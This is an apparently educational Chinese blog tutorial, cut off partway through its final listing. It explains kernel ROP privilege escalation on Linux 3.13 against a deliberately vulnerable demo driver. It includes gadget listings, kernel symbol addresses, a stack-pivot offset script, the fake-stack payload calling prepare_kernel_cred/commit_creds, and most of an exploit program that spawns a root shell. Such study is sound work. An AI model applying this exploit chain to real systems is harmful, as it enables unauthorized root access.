              <time title="创建于：2017-06-28 22:12:21" itemprop="dateCreated datePublished" datetime="2017-06-28T22:12:21+08:00">2017-06-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>这是篇文章主要介绍一下Linux内核中的ROP chain如何构造来提升用户权限。内核ROP经常用来绕过和非可执行内存区域相关的限制，例如，在默认内核上，它提供了一种可以绕过内核和用户地址分离缓解技术（例如SMEP）的方法。<br>结果成功需要满足如下条件：</p>
<ul>
<li>执行一个权限提升的有效载荷</li>
<li>可以引用驻留在用户空间的数据（允许从用户空间获取数据）</li>
<li>驻留在用户空间的指令可能不能被执行</li>
</ul>
<p>在典型的<code>ret2usr</code>攻击中，内核执行流被重定向到一个用户空间的地址，这个地址中包含了提权的载荷：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">void __attribute__((regparm(3))) payload() &#123;</span><br><span class="line">    commit_creds(prepare_kernel_cred(0));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上述提权payload会分配一个新的凭证结构（uid=0, gid=0等）并将它应用到调用进程。我们可以构建一个ROP链，使得这个链不需要执行任何驻留在用户空间中的结构就会执行上述操作，在内核中执行整个权限提升payload。实际中可能不太必要，比如要绕过<code>SMEP</code>，使用一个ROP翻转<code>smep</code>，然后就可以在用户空间执行一个标准的权限提升过程了。<br>ROP链看起来大概是这样的：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">+-------------------------------+</span><br><span class="line">|       pop %rdi; ret           |</span><br><span class="line">+-------------------------------+</span><br><span class="line">|              NULL             |</span><br><span class="line">+-------------------------------+</span><br><span class="line">| addr of prepare_kernel_cred() |</span><br><span class="line">+-------------------------------+</span><br><span class="line">|      mov %rax, %rdi; ret      |</span><br><span class="line">+-------------------------------+</span><br><span class="line">|     addr of commit_creds()    |</span><br><span class="line">+-------------------------------+</span><br><span class="line">|              ...              |</span><br><span class="line">+-------------------------------+</span><br></pre></td></tr></table></figure>
<p>这里的ROP构造和用户空间的ROP构造基本相同，后面会讨论一些凭据适用就返回给用户空间的细节。<br>下面先讲一下如何找到有用的ROP gadgets，我用的是Ubuntu 12.04.5 x86_64，下载编译了linux-3.13源码。</p>
<h3 id="Gadgets"><a href="#Gadgets" class="headerlink" title="Gadgets"></a>Gadgets</h3><p>和用户空间的程序相同，ROP gadgets可以从内核二进制文件vmlinux中提取。用ROPgadget找vmlinux中的gadgets速度总是很慢，这里可以先将所有的gadgets识别出来：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary vmlinux &gt; ropgadget</span><br><span class="line">$ grep &#39;: pop rdi ; ret&#39; ropgadget </span><br><span class="line">0xffffffff810d783d : pop rdi ; ret    &lt;--- our first gadget</span><br><span class="line">0xffffffff8215673a : pop rdi ; ret 0</span><br><span class="line">0xffffffff8189ae00 : pop rdi ; ret 0x3018</span><br><span class="line">0xffffffff81f5ef0d : pop rdi ; ret 0x31</span><br><span class="line">0xffffffff818463ec : pop rdi ; ret 0x40a3</span><br><span class="line">0xffffffff812f8501 : pop rdi ; ret 0x42</span><br><span class="line">0xffffffff8197d423 : pop rdi ; ret 0x74ab</span><br><span class="line">0xffffffff8197d437 : pop rdi ; ret 0x74d8</span><br><span class="line">0xffffffff8181c158 : pop rdi ; ret 0x81a6</span><br><span class="line">0xffffffff82048be1 : pop rdi ; ret 0x87</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>这样就能在识别出的ROP gadgets里快速找出需要的gadget了。上述的gadgets都可以被使用。<code>ret [num]</code>这样的gadget会将栈指针递增，ret使用一个操作数来表示在获取下一条指令后从栈中弹出的字节数。注意：一个gadget可能是在一个非执行页中，这时要找一个可代换的gadget。<br>找到<code>prepare_kernel_cred</code>和<code>commit_creds</code>的地址：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ sudo grep prepare_kernel_cred &#x2F;proc&#x2F;kallsyms</span><br><span class="line">ffffffff81092870 T prepare_kernel_cred</span><br><span class="line">$ sudo grep commit_creds &#x2F;proc&#x2F;kallsyms</span><br><span class="line">ffffffff81092570 T commit_creds</span><br></pre></td></tr></table></figure>
<p>ROP链的初步构造如下：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">+----------------------------------------------+</span><br><span class="line">| 0xffffffff810d783d : pop rdi ; ret           |</span><br><span class="line">+----------------------------------------------+</span><br><span class="line">| NULL                                         |</span><br><span class="line">+----------------------------------------------+</span><br><span class="line">| 0xffffffff81092870 : prepare_kernel_cred     |</span><br><span class="line">+----------------------------------------------+</span><br><span class="line">| 0xffffffff8110eaa3 : pop rdx ; ret           |</span><br><span class="line">+----------------------------------------------+</span><br><span class="line">| 0xffffffff81092570 : commit_creds            |</span><br><span class="line">+----------------------------------------------+</span><br><span class="line">| 0xffffffff81036321 : mov rdi, rax ; call rdx |</span><br><span class="line">+----------------------------------------------+</span><br></pre></td></tr></table></figure>

<h3 id="有漏洞的驱动"><a href="#有漏洞的驱动" class="headerlink" title="有漏洞的驱动"></a>有漏洞的驱动</h3><p>为了演示内核中ROP链的可用性，用以下有漏洞的驱动进行演示：  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">drv_req</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> offset;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">device_ioctl</span><span class="params">(struct file *file, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> args)</span> </span>&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">drv_req</span> *<span class="title">req</span>;</span></span><br><span class="line">    <span class="keyword">void</span> (*fn)(<span class="keyword">void</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>(cmd) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        req = (struct drv_req *)args;</span><br><span class="line">        printk(KERN_INFO <span class="string">&quot;size = %lx\n&quot;</span>, req-&gt;offset);</span><br><span class="line">        printk(KERN_INFO <span class="string">&quot;fn is at %p\n&quot;</span>, &amp;ops[req-&gt;offset]);</span><br><span class="line">        fn = &amp;ops[req-&gt;offset];</span><br><span class="line">        fn();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>ops</code>数组没有进行边界检查。用户提供的偏移量足够大就可以在用户空间或内核空间中访问任何内存地址。<br>驱动在加载时注册<code>/dev/vulndrv</code>设备并打印<code>ops</code>数组地址。  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo insmod drv.ko</span><br><span class="line">$ sudo chmod 777 &#x2F;dev&#x2F;vulndrv</span><br></pre></td></tr></table></figure>
<p>我们可以通过提供给用户空间的ioctl接口到达漏洞代码。</p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>通过提供一种预先计算的偏移，任何内核空间中的存储地址都可以被执行。我们可以把<code>fn()</code>指向mmap的用户空间存储地址（含提权的payload），但是要记住最初的需求：驻留在用户空间的指令不应该被执行。<br><strong>Stack Pivot</strong><br>因为不能将内核控制流重定向到用户空间地址，所以需要在内核空间中寻找合适的gadget。在用户空间中准备我们的ROP链，然后将栈指针设置到ROP链的开头。这样不直接执行驻留在用户空间中的指令，而是从用户空间中获取指向内核空间中的指令。<br>在有漏洞的函数<code>device_ioctl()</code>的开头设断点，我们可以在函数指针解引用之前检查寄存器的值。这里因为我是用IDA调试，不太会加载驱动程序的代码段到IDA中，所以在调试内核的IDA之外又开了一个IDA，反编译驱动程序的二进制文件，然后在前一个IDA中的<code>breakpoints</code>里插入断点。<br><img src="/images/kernelrop/drv.png"><br>由驱动的反汇编代码可知<code>rax</code>包含要执行的指令地址。我们可以提前计算这个地址，因为已知ops数组的基地址和用户传递的offset值。例如，给定的ops基地址<code>0xffffffffaaaaaaaf</code>和<code>offset=0×6806288</code>，<code>fn</code>地址为<code>0xffffffffaaaaaaaf+8*0×6806288=0xffffffffdeadbeef</code>。<br>反过来，可以计算出需要执行的内核目标地址相对ops数组的偏移值。有很多stack pivot的gadgets，例如用户空间常见的stack pivot如下：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov %rsp, %r*x ; ret</span><br><span class="line">mov %rsp, ... ; ret</span><br><span class="line">xchg %r*x, %rsp ; ret</span><br></pre></td></tr></table></figure>
<p>在内核空间执行任意代码，需要把栈指针设置到我们控制的用户空间地址。虽然我们的测试环境是64位，但是最后一个stack pivot使用32位寄存器，即<code>xchg %e*x, %esp;ret</code>或<code>xchg %esp, %e*x;ret</code>，这里用到的是<code>xchg eax, esp;ret</code>（执行完指令后高32位都会被清0）。如果<code>rax</code>包含有效的内核内存地址（例如<code>0xffffffff********</code>），则该stack pivot指令将<code>rax</code>的低32位（<code>0x********</code>为用户空间地址）设置为新的栈指针。由于该<code>rax</code>值在执行fn()之前已知，所以我们知道新的用户空间栈将在哪里，并相应地执行mmap操作。(这里是<strong>关键</strong>：<code>rax</code>表示了内核中gadget的地址，其低32位<code>eax</code>表示了一个用户空间地址)<br>内核中有很多适合的包含xchg指令的stack pivots：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ grep &#39;: xchg eax, esp ; ret&#39; ropgadget</span><br><span class="line">0xffffffff81000085 : xchg eax, esp ; ret</span><br><span class="line">0xffffffff8221be67 : xchg eax, esp ; ret 0</span><br><span class="line">0xffffffff8155b554 : xchg eax, esp ; ret 0x103d</span><br><span class="line">0xffffffff81023d99 : xchg eax, esp ; ret 0x10a8</span><br><span class="line">0xffffffff81733be2 : xchg eax, esp ; ret 0x12eb</span><br><span class="line">0xffffffff814a581d : xchg eax, esp ; ret 0x148</span><br><span class="line">0xffffffff81198279 : xchg eax, esp ; ret 0x148d</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>选择stack pivot gadget时，唯一需要注意的是要8字节对齐（因为ops是8字节指针的数组，而且其基址是8字节对齐的），下面的脚本可以查找合适的gadget：  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">base_addr = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(sys.argv[<span class="number">2</span>], <span class="string">&#x27;r&#x27;</span>) <span class="comment"># gadgets</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">    target_str, gadget = line.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    target_addr = <span class="built_in">int</span>(target_str, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> target_addr % <span class="number">8</span> != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    offset = (traget_addr - base_addr) / <span class="number">8</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;offset = &#x27;</span>, (<span class="number">1</span> &lt;&lt; <span class="number">64</span>) + offset</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;gadget = &#x27;</span>, gadget.strip()</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;stack addr = %x&#x27;</span> % (target_addr &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">============================================================</span><br><span class="line">$ cat ropgadget | grep <span class="string">&#x27;: xchg eax, esp ; ret&#x27;</span> &gt; stackpivots</span><br><span class="line">$ ./find_offset.py ffffffffa02d8340 stackpivots</span><br><span class="line">offset = <span class="number">18446744073644277591</span></span><br><span class="line">gadget = xchg eax, esp ; ret <span class="number">0x14ff</span></span><br><span class="line">stack addr = <span class="number">810</span>d7df8</span><br></pre></td></tr></table></figure>
<p>stack addr表示ROP链需要<code>mmaped(fake_stack)</code>的用户空间地址：  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> *fake_stack;</span><br><span class="line"></span><br><span class="line">mmap_addr = stack_addr &amp; <span class="number">0xfffff000</span>;</span><br><span class="line">assert((mapped = mmap((<span class="keyword">void</span>*)mmap_addr, <span class="number">0x2000</span>, PROT_EXEC|PROT_READ|PROT_WRITE,</span><br><span class="line">    MAP_POPULATE|MAP_FIXED|MAP_GROWSDOWN, <span class="number">0</span>, <span class="number">0</span>)) == (<span class="keyword">void</span>*)mmap_addr);</span><br><span class="line"></span><br><span class="line">fake_stack = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(stack_addr);</span><br><span class="line">*fake_stack ++= <span class="number">0xffffffff810d783d</span>UL; <span class="comment">/* pop %rdi; ret */</span></span><br><span class="line"></span><br><span class="line">fake_stack = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(stack_addr + <span class="number">0x9d5f</span>);</span><br></pre></td></tr></table></figure>
<p>这里选择的stack pivot带有操作数，表示执行完<code>xchg eax, esp; ret</code>（即<code>xchg eax, esp; pop eip</code>，此时<code>esp</code>就指向了<code>eax</code>表示的用户空间栈<code>fake_stack</code>，<code>eip</code>就变成了<code>fake_stack</code>中的gadget）之后，会弹出栈上的0x14ff个字节，按道理讲第二条ROP链应该位于<code>fake_stack</code>偏移为0x14ff+8的位置，但是通过调试发现偏移却是0x9d5f（调试时在device_ioctl的call rax下断点，单步执行查看rsp变化即可）。<br><strong>Payload</strong><br>我们在用户空间中准备ROP链：  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">fake_stack = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(stack_addr);</span><br><span class="line"></span><br><span class="line">*fake_stack ++= <span class="number">0xffffffff810d783d</span>UL;   <span class="comment">/* pop %rdi; ret */</span></span><br><span class="line">fake_stack = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(stack_addr + <span class="number">0x9d5f</span>);</span><br><span class="line">*fake_stack ++= <span class="number">0x0</span>UL;                  <span class="comment">/* NULL */</span></span><br><span class="line">*fake_stack ++= <span class="number">0xffffffff81092870</span>UL;   <span class="comment">/* prepare_kernel_cred() */</span></span><br><span class="line">*fake_stack ++= <span class="number">0xffffffff8110eaa3</span>UL;   <span class="comment">/* pop %rdx; ret */</span></span><br><span class="line"><span class="comment">//*fake_stack ++= 0xffffffff81092570UL; /* commit_creds() */</span></span><br><span class="line">*fake_stack ++= <span class="number">0xffffffff81092576</span>UL;   <span class="comment">/* commit_creds() + 2 instructions */</span></span><br><span class="line">*fake_stack ++= <span class="number">0xffffffff81036321</span>UL;   <span class="comment">/* mov %rax, %rdi; call %rdx */</span></span><br></pre></td></tr></table></figure>
<p>这里对<code>commit_creds()</code>地址进行了一些修改，地址偏移了2个指令。因为<code>commit_creds()</code>是通过call调用的（call rdx）。call指令在跳转到目标地址之前将返回地址压栈，因此执行完<code>commit_creds()</code>后，控制会转移到保存的返回地址。但是我们希望其转移到ROP链中的下一个gadget。跳过函数开头的<code>push rbp</code>即可（函数执行完，pop指令会把保存的返回地址弹出到rbp中），ret会将控制流转移到ROP链中的下一个gadget。<br><img src="/images/kernelrop/commitcreds.png"><br><strong>固定</strong><br>上述ROP链可以得到调用进程超级用户的权限，但是，所有ROP gadgets执行完之后，需要用之前介绍过的<a target="_blank" rel="noopener" href="http://pwn4.fun/2017/04/20/Linux%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%88%E4%B8%89%EF%BC%89Kernel-Stack-Buffer-Overflow/">iret</a>（特权返回）指令从内核空间返回到用户空间进程。这里为64位操作数的iretq，堆栈布局如下所示：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">+---------+&lt;---Low mem addr</span><br><span class="line">|   RIP   |</span><br><span class="line">+---------+</span><br><span class="line">|    CS   |</span><br><span class="line">+---------+</span><br><span class="line">| EFLAGS  |</span><br><span class="line">+---------+</span><br><span class="line">|   RSP   |</span><br><span class="line">+---------+</span><br><span class="line">|    SS   |</span><br><span class="line">+---------+&lt;---High mem addr</span><br></pre></td></tr></table></figure>
<p>下面扩展ROP链，包含一个新的用户空间指令指针（RIP），用户空间栈指针（RSP），代码和堆栈段选择器（CS和SS），以及具有各种状态信息的EFLAGS寄存器。可以使用下面的save_state()函数从用户空间进程获取CS，SS和EFLAGS值：  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_cs, user_ss, user_rflags;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">save_state</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">&quot;movq %%cs, %0\n&quot;</span></span><br><span class="line">        <span class="string">&quot;movq %%ss, %1\n&quot;</span></span><br><span class="line">        <span class="string">&quot;pushfq\n&quot;</span></span><br><span class="line">        <span class="string">&quot;popq %2\n&quot;</span></span><br><span class="line">        : <span class="string">&quot;=r&quot;</span> (user_cs), <span class="string">&quot;=r&quot;</span> (user_ss), <span class="string">&quot;=r&quot;</span> (user_rflags) : : <span class="string">&quot;memory&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>内核.text段的iretq指令地址可以通过objdump获得：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ objdump -j .text -d vmlinux | grep iretq | head -1</span><br><span class="line">ffffffff81051fe6:       48 cf                   iretq</span><br></pre></td></tr></table></figure>
<p>最后要注意的是，在执行iret之前，64位系统需要实现swapgs指令。该指令通过用一个MSR中的值交换GS寄存器的内容。在进入内核空间例行程序(例如系统调用)时会执行swapgs指令以获取指向内核数据结构的指针，因此在返回用户空间之前需要一个匹配的swapgs。<br>最后完整的exp如下：  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;drv.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEVICE_PATH <span class="meta-string">&quot;/dev/vulndrv&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_cs;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_ss;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_rflags;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">save_state</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">    <span class="string">&quot;movq %%cs, %0\n&quot;</span></span><br><span class="line">    <span class="string">&quot;movq %%ss, %1\n&quot;</span></span><br><span class="line">    <span class="string">&quot;pushfq\n&quot;</span></span><br><span class="line">    <span class="string">&quot;popq %2\n&quot;</span></span><br><span class="line">    : <span class="string">&quot;=r&quot;</span> (user_cs), <span class="string">&quot;=r&quot;</span> (user_ss), <span class="string">&quot;=r&quot;</span> (user_rflags) : : <span class="string">&quot;memory&quot;</span>         );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!getuid())</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usage</span><span class="params">(<span class="keyword">char</span> *bin_name)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%s array_offset_decimal array_base_address_hex\n&quot;</span>, bin_name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">drv_req</span> <span class="title">req</span>;</span></span><br><span class="line">    <span class="keyword">void</span> *mapped, *temp_stack;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> base_addr, stack_addr, mmap_addr, *fake_stack;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">3</span>) &#123;</span><br><span class="line">        usage(argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    req.offset = strtoul(argv[<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">10</span>);</span><br><span class="line">    base_addr  = strtoul(argv[<span class="number">2</span>], <span class="literal">NULL</span>, <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;array base address = 0x%lx\n&quot;</span>, base_addr);</span><br><span class="line">    stack_addr = (base_addr + (req.offset * <span class="number">8</span>)) &amp; <span class="number">0xffffffff</span>;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stdout</span>, <span class="string">&quot;stack address = 0x%lx\n&quot;</span>, stack_addr);</span><br><span class="line"></span><br><span class="line">    mmap_addr = stack_addr &amp; <span class="number">0xffff0000</span>;</span><br><span class="line">    assert((mapped = mmap((<span class="keyword">void</span>*)mmap_addr, <span class="number">0x20000</span>, <span class="number">7</span>, <span class="number">0x32</span>, <span 